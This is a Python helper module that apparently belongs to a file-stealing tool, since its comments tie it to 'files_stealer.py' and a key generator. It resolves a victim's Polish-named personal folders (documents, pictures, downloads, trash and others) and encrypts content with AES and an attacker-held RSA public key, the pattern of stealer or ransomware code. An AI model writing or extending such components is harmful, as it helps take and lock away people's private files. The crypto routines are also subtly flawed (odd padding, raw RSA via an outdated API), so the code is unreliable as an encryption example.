# -*- coding: utf-8 -*-

import os
import time
import base64
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

public_key_size = 2048 #integrate with keys_generator.py
public_key_name = "pbl.key" #integrate with name in files_stealer.py
chunk_size = public_key_size / 8

def translate_special_path(path):
    home_folder = os.path.expanduser("~")
    return "{0}/{1}".format(home_folder, get_special_folder(path))


def get_paths(custom_paths, special_paths):
    paths = custom_paths
    for path in special_paths:
        paths.append(translate_special_path(path))
    return paths


def fill_line():
    return "-" * 100 + "\n"


def get_special_folder(x):
    return {
        'DOC': "Dokumenty",
        'MUS': "Muzyka",
        'PIC': "Obrazy",
        'DWNLD': "Pobrane",
        'VID': "Wideo",
        'BIN': "Kosz",
        'NET': "Sieć"
    }[x]


def get_module_info(module_name):
    return "{0} - {1}".format(module_name, time.strftime("%Y-%m-%d %H:%M"))


def pad(word, key_size):
    return word + (key_size - len(word) % key_size) * chr(96)


def divide_file_content_by_chunk_size(content):
        for start in range(0, len(content), chunk_size):
            yield content[start:start + chunk_size]


def encrypt_word_with_key(content, key):
    result = ""
    content = pad(content, len(key))
    init_vector = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, init_vector)
    chunks = divide_file_content_by_chunk_size(content)
    result += base64.b64encode(init_vector) + "\n"
    for chunk in chunks:
        result += base64.b64encode(cipher.encrypt(chunk)) + "\n"
    return result


def get_public_key():
    with open(public_key_name, "rt") as pub_key:
        return RSA.importKey(pub_key.read())


def encrypt_file_content_with_public_key(file_content, block_size):
    public_key = get_public_key()
    chunks = divide_file_content_by_chunk_size(file_content)
    result = ""
    for chunk in chunks:
        result += base64.b64encode((public_key.encrypt(chunk, block_size)[0])) + "\n"
    return result
